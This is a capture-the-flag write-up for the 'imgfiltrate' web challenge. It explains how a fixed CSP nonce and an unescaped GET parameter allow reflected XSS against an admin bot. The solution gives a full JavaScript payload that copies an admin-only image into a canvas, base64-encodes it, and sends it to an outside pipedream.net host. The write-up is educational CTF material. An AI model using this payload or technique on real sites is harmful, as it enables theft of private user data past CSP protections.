<h1>Circle City Con CTF 2021 [web] imgfiltrate writeup</h1>

<h2>Challenge</h2>

<p>Can you yoink an image from the admin page?</p>

<p>App: http://35.224.135.84:3200
Admin bot: http://35.224.135.84:3201</p>

<p>Author: qxxxb</p>

<p>```
Hint! In this challenge there are two services: the web app and the admin bot.</p>

<p>docker-compose creates an internal network for these two services, and the web app has an internal hostname set to imgfiltrate.hub.</p>

<p>Note that the admin bot's cookie is set for this internal domain, not the external domain at 35.224.135.84. This means that when you submit a URL to the admin bot, you must do something like:
http://imgfiltrate.hub/<stuff>
```</p>

<h2>Solution</h2>

<p>Check the source code, there is CSP settings.</p>

<p><code>app/public/index.php</code></p>

<p><code>html
&lt;meta http-equiv="Content-Security-Policy" content="default-src 'none'; img-src 'self'; script-src 'nonce-70861e83ad7f1863b3020799df93e450';"&gt;
</code></p>

<p>This site only allows images of the same origin and script tags with nonces as external resources.</p>

<p>We can embed any code into html with the get parameter.</p>

<p><code>app/public/index.php</code></p>

<p><code>php
Hello &lt;?php echo $_GET['name'] ?? 'bozo' ?&gt;
</code></p>

<p>Also, the CSP nonce is fixed, so you can check the xss at this URL.</p>

<p><code>
http://35.224.135.84:3200/?name=&lt;script nonce="70861e83ad7f1863b3020799df93e450"&gt;alert(1)&lt;/script&gt;
</code></p>

<p>And the purpose of the attack is an image that is only displayed when the bot accesses this site.</p>

<p>(The cookie "token" has the httpOnly attribute, so it cannot be retrieved by XSS.)</p>

<p><code>app/public/flag.php</code></p>

<p>```php
<?php</p>

<p>header('Content-Type: image/png');</p>

<p>if (isset($<em>COOKIE['token']) &amp;&amp; $</em>COOKIE['token'] === getenv('TOKEN')) {
    $filepath = '/opt/flag.png';
} else {
    $filepath = '/opt/no_flag.png';
}</p>

<p>echo file<em>get</em>contents($filepath);
```</p>

<p><code>bot/main.js</code></p>

<p>```javascript
  await page.setCookie({
    name: 'token',
    value: process.env.TOKEN,
    domain: 'imgfiltrate.hub',
    sameSite: 'strict',
    httpOnly: true
  })</p>

<p>try {
    await page.goto(url, { timeout: 5000, waitUntil: 'networkidle2' })
    await page.waitForTimeout(2000)
  } finally {
    await page.close()
    await ctx.close()
  }
```</p>

<p>Therefore, the attack is the following procedure</p>

<ol>
<li><p>Create a new script tag using <code>document.createElement</code>.</p></li>
<li><p>Convert flag images to base64 data.</p></li>
<li><p>Send the image data externally with the "src" of the script tag generated in 1.</p></li>
</ol>

<p><code>html
  &lt;script nonce="70861e83ad7f1863b3020799df93e450"&gt;
    // 1. Create a new script tag using `document.createElement`.
    var oScript = document.createElement("script");
    oScript.nonce = "70861e83ad7f1863b3020799df93e450";
    oScript.type = "text\/javascript";
    document.currentScript.parentNode.insertBefore(oScript, document.currentScript);
    // Wait one second for the image to load.
    setTimeout(function () {
      // 2. Convert flag images to base64 data.
      var img = document.getElementById("flag");
      var canvas = document.createElement('canvas');
      var ctx = canvas.getContext('2d');
      canvas.width = img.width;
      canvas.height = img.height;
      ctx.drawImage(img, 0, 0);
      var data = canvas.toDataURL('image/jpeg');
      var data2 = data.replace(/^.*,/, '').replace(/\//g, '-').substring(0, 5000);
      // 3. Send the image data externally with the "src" of the script tag generated in 1.
      oScript.src = `https://x.pipedream.net/?a=${data2}`;
    }, "1000");
  &lt;/script&gt;
</code></p>

<p>Minify this code to make it read as XSS.</p>
